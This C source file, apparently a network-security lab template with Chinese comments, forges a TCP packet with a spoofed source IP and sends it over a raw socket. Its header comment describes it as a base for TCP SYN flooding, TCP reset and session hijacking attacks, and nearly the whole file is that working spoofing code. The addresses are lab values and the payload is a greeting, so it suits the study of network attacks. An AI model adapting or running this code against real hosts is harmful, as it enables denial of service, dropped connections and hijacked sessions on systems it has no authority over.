#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>

#include "myheader.h"

// 定义源和目标IP地址、端口、序列号和数据内容
#define SRC_IP     "1.2.3.4"
#define DEST_IP    "10.0.2.5"
#define SRC_PORT   42433
#define DEST_PORT  9090 
#define SEQ_NUM    3092566627
#define TCP_DATA   "Hello Server!"

// 函数声明：计算TCP校验和和发送原始IP数据包
unsigned short calculate_tcp_checksum(struct ipheader *ip);
void   send_raw_ip_packet (struct ipheader* ip);

/******************************************************************
  Spoof a TCP packet. Can be used for the following attacks: 
              --- TCP SYN Flooding Attack
              --- TCP Reset Attack
              --- TCP Session Hijacking Attack
*******************************************************************/
int main() {		
   char buffer[2000]; // 用于存储IP和TCP数据包的缓冲区

   srand(time(0)); // 初始化随机数生成器，用于某些攻击
	
   memset(buffer, 0, 2000); // 清零缓冲区

   struct ipheader *ip = (struct ipheader *) buffer; // 指向IP头部的指针
   struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader)); // 指向TCP头部的指针

   /*********************************************************
      Step 1: Fill in the TCP data field.
    ********************************************************/
   char *data = buffer + sizeof(struct ipheader) + sizeof(struct tcpheader); // 指向TCP数据部分的指针
   const char *msg = TCP_DATA; // 数据内容
   int data_len = strlen(msg); // 数据长度
   strncpy (data, msg, data_len); // 复制数据到缓冲区


   /*********************************************************
      Step 2: Fill in the TCP header.
    ********************************************************/
   tcp->tcp_sport = htons(SRC_PORT); // 设置源端口
   tcp->tcp_dport = htons(DEST_PORT); // 设置目标端口
   tcp->tcp_seq = htonl(SEQ_NUM); // 设置序列号
   tcp->tcp_offx2 = 0x50; // 设置TCP头部长度
   tcp->tcp_flags = 0x00; // 设置TCP标志位
   tcp->tcp_win =  htons(20000); // 设置窗口大小
   tcp->tcp_sum =  0; // 初始化校验和为0

   /*********************************************************
      Step 3: Fill in the IP header.
    ********************************************************/
   ip->iph_ver = 4; // 设置IP版本为IPv4
   ip->iph_ihl = 5; // 设置IP头部长度
   ip->iph_ttl = 20; // 设置生存时间
   ip->iph_sourceip.s_addr = inet_addr(SRC_IP); // 设置源IP地址
   ip->iph_destip.s_addr = inet_addr(DEST_IP); // 设置目标IP地址
   ip->iph_protocol = IPPROTO_TCP; // 设置协议类型为TCP
   ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len); // 设置总长度

   // 计算TCP校验和，因为校验和包括部分IP头部
   tcp->tcp_sum = calculate_tcp_checksum(ip); 
	
   // IP校验和不需要手动设置，系统会自动处理
   // ip->iph_chksum = ...

   /*********************************************************
      Step 4: Finally, send the spoofed packet
    ********************************************************/
   send_raw_ip_packet(ip); // 发送伪造的IP数据包

   return 0;
}